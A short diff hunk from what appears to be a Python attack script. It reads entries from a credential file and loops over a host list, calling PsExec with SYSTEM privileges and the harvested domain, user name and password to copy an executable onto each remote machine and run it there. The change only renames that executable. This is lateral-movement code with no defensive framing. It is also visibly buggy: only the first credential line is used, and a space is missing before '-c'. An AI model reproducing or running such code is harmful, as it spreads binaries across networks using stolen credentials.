@@ -184,7 +184,7 @@ f=open('C:\module2\GetCredential\Credential_use_1000.txt','r', encoding='UTF-8')
 line = f.readlines()
 for i in range(len(list)-1):
     lines = line[0].split(".")
-    return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe' + ' -s \\' + list[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\everything.exe')
+    return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe' + ' -s \\' + list[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\everythin.exe')
 f.close()
 
 #'C:\module2\DownloadFile-main\PsExec.exe'
